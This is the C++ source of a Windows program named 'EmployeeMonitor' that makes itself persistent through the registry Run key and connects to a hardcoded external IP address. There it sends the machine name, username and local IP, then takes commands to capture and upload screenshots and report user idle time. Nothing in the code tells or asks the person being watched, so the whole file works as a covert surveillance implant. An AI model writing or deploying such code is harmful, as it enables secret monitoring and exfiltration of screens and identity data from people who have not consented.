#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <Lmcons.h>
#include <shlwapi.h>
#include <vector>
#include <string>
#include <sstream>
#include <ctime>
#include "win_screenshot.h"

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Shlwapi.lib")

#define SERVER_IP "195.133.25.38"
#define SERVER_PORT 46512

using namespace std;

void AddToStartup() {
    HKEY hKey;
    const char* keyPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    const char* appName = "EmployeeMonitor";

    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);

    if (RegOpenKeyExA(HKEY_CURRENT_USER, keyPath, 0, KEY_READ | KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        char existingValue[MAX_PATH] = {};
        DWORD bufSize = sizeof(existingValue);

        LONG result = RegQueryValueExA(hKey, appName, NULL, NULL, (LPBYTE)existingValue, &bufSize);

        if (result != ERROR_SUCCESS || _stricmp(existingValue, exePath) != 0) {
            RegSetValueExA(hKey, appName, 0, REG_SZ, (const BYTE*)exePath, strlen(exePath) + 1);
        }

        RegCloseKey(hKey);
    }
}

string GetComputerNameStr() {
    char name[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(name);
    if (GetComputerNameA(name, &size)) return string(name);
    return "Unknown";
}

string GetUsernameStr() {
    char username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    if (GetUserNameA(username, &username_len)) return string(username);
    return "Unknown";
}

string GetLocalIP() {
    char host[256];
    if (gethostname(host, sizeof(host)) == SOCKET_ERROR) return "0.0.0.0";

    struct addrinfo hints = {}, * res = nullptr;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    if (getaddrinfo(host, NULL, &hints, &res) != 0 || res == nullptr) {
        return "0.0.0.0";
    }

    char ip[INET_ADDRSTRLEN];
    struct sockaddr_in* addr = (struct sockaddr_in*)res->ai_addr;
    inet_ntop(AF_INET, &(addr->sin_addr), ip, INET_ADDRSTRLEN);
    freeaddrinfo(res);
    return string(ip);
}

void SendClientInfo(SOCKET sock) {
    ostringstream oss;
    oss << "INFO:" << GetComputerNameStr() << ";"
        << GetUsernameStr() << ";"
        << GetLocalIP() << ";";
    string msg = oss.str();
    send(sock, msg.c_str(), msg.length(), 0);
}

time_t GetLastUserInputTime() {
    LASTINPUTINFO lii = { sizeof(LASTINPUTINFO), 0 };
    if (GetLastInputInfo(&lii)) {
        DWORD idle_ms = GetTickCount() - lii.dwTime;
        return time(nullptr) - idle_ms / 1000;
    }
    return time(nullptr);
}

void ListenForCommands(SOCKET sock) {
    char buffer[1024];
    while (true) {
        int bytes = recv(sock, buffer, sizeof(buffer) - 1, 0);
        if (bytes <= 0) break;
        buffer[bytes] = '\0';

        string cmd(buffer);

        if (cmd == "GET_SCREENSHOT") {
            vector<BYTE> img = CaptureScreenToMemory();
            int size = static_cast<int>(img.size());
            send(sock, (char*)&size, sizeof(int), 0);
            send(sock, (char*)img.data(), size, 0);
        }
        else if (cmd == "PING") {
            time_t last_input = GetLastUserInputTime();
            ostringstream pongMsg;
            pongMsg << "PONG:" << last_input;
            string msg = pongMsg.str();
            send(sock, msg.c_str(), msg.length(), 0);
        }
        else if (cmd == "EXIT") {
            break;
        }
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    AddToStartup();

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return 1;
    }

    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }

    sockaddr_in srvAddr = {};
    srvAddr.sin_family = AF_INET;
    srvAddr.sin_port = htons(SERVER_PORT);
    inet_pton(AF_INET, SERVER_IP, &srvAddr.sin_addr);

    if (connect(sock, (sockaddr*)&srvAddr, sizeof(srvAddr)) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    SendClientInfo(sock);
    ListenForCommands(sock);

    closesocket(sock);
    WSACleanup();
    return 0;
}
